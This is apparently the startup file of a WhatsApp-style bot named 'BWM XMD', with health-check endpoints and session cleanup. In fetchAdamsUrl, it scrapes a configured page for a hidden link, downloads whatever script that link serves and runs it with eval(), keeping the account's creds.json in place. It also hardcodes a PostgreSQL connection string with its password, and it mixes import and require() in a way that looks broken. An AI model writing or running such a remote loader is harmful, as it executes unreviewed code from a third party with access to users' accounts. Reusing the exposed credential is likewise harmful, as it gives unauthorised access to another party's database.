//=====================//
//     Bwm xmd         //
//  Sir Ibrahim Adams  //
//=====================//

import fs from 'fs';
import path from 'path';
import axios from 'axios';
import pkg from 'pg';
const { Pool } = pkg;
import { fileURLToPath } from 'url';
import { dirname } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename); // Added for PostgreSQL interaction
const { initializeDatabase } = require('./Ibrahim/api/db'); // Assuming this file will contain DB setup

// Function to clear session data
function clearSessionData() {
  const sessionDir = path.join(__dirname, 'Session');

  if (fs.existsSync(sessionDir)) {
    const files = fs.readdirSync(sessionDir);

    for (const file of files) {
      if (file !== 'creds.json') { // Preserve credentials file
        const filePath = path.join(sessionDir, file);
        try {
          fs.unlinkSync(filePath);
          console.log(`Cleared session file: ${file}`);
        } catch (err) {
          console.error(`Error clearing file ${file}:`, err);
        }
      }
    }
    console.log('Session data cleared successfully');
  }
}

// Clear session data before starting
clearSessionData();
const cheerio = require('cheerio');
require('events').EventEmitter.defaultMaxListeners = 25;
const adams = require(__dirname + "/config");

// Configure port for scale-to-zero support
const PORT = process.env.PORT || 8080;
const http = require('http');
const express = require('express');
const app = express();

// Health check endpoints for scale-to-zero
app.get('/', (req, res) => {
  res.status(200).send('BWM XMD Bot Status: Online');
});

app.get('/health', (req, res) => {
  const status = {
    status: 'healthy',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    bot: global.xmd && global.xmd.user ? 'connected' : 'disconnecting'
  };
  res.status(200).json(status);
});

// Ready check for scale-to-zero
app.get('/ready', (req, res) => {
  if (global.xmd && global.xmd.user) {
    res.status(200).json({ ready: true });
  } else {
    res.status(503).json({ ready: false });
  }
});
const server = http.createServer(app);
server.listen(PORT, '0.0.0.0', () => {
  console.log(`BWM XMD Bot Server running on port ${PORT}`);
});

// Single keep-alive ping and connection check
const PING_INTERVAL = 60000; // 1 minute
let reconnectAttempts = 0;
const MAX_RECONNECT_ATTEMPTS = 5;

setInterval(async () => {
  try {
    if (global.xmd?.user) {
      console.log("Bot connection active");
      reconnectAttempts = 0;
    } else if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
      console.log("Connection lost, attempting to reconnect...");
      reconnectAttempts++;
      // Clear any existing sessions
      clearSessionData();
      // Attempt to reconnect
      await fetchAdamsUrl();
    } else {
      console.log("Max reconnection attempts reached. Please restart the bot manually.");
      process.exit(1);
    }
  } catch (error) {
    console.error("Connection check error:", error.message);
  }
}, PING_INTERVAL);

// Clear existing sessions before startup
clearSessionData();

async function fetchAdamsUrl() {
  try {
    // Add delay between connection attempts
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const adamsUrlElement = $('a:contains("ADAM_URL")'); 
    const adamsUrl = adamsUrlElement.attr('href');

    if (!adamsUrl) {
      throw new Error('The URL link not found...');
    }

    // Check for existing connection
    if (global.xmd?.user) {
      console.log('Session already exists, cleaning up first...');
      await global.xmd.logout();
      delete global.xmd;
    }

    console.log('Connecting to the server...');
    const scriptResponse = await axios.get(adamsUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Fatal Error:', {
      message: error.message,
      stack: error.stack,
      timestamp: new Date().toISOString(),
      type: error.name,
      code: error.code || 'UNKNOWN'
    });

    // Attempt to recover or gracefully shutdown
    if (error.code === 'MODULE_NOT_FOUND') {
      console.error('Missing required module. Please check your dependencies.');
    } else if (error.code === 'ECONNREFUSED') {
      console.error('Connection refused. Please check your network connection.');
    }
  }
}

// Placeholder for database connection details (replace with your actual credentials)
const SM_DB = 'postgresql://postgres:zuzeIwLmEisQPsUkLmbBLkYxYXhIOLiT@crossover.proxy.rlwy.net:16749/railway';
const pool = new Pool({ connectionString: SM_DB });


// Database initialization moved to Ibrahim/api/db.js


async function startBwm() {
  const { initializeDatabase } = require('./Ibrahim/api/db');
  await initializeDatabase();
  fetchAdamsUrl();
}

startBwm();